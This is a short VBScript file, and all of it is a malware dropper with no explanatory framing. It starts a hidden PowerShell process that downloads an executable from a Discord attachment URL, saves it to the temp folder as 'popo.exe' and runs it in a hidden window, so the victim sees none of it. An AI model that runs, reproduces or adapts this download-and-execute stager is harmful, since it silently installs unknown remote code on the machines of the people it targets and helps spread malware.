Set WshShell = CreateObject("WScript.Shell")
strCmd = "powershell.exe -NoProfile -WindowStyle Hidden -Command " & _
    """$url = 'https://cdn.discordapp.com/attachments/1344411176443842676/1439705266177314846/Ocean.exe?ex=691b7d83&is=691a2c03&hm=a5a7761cbf8562817639ca6cd01a16347b2c481cd2e696e88a6d72843e47f1ed&';" & _
    " $out = Join-Path $env:TEMP 'popo.exe';" & _
    " Invoke-WebRequest -Uri $url -OutFile $out;" & _
    " Start-Process -FilePath $out -WindowStyle Hidden"""
WshShell.Run strCmd, 0, False
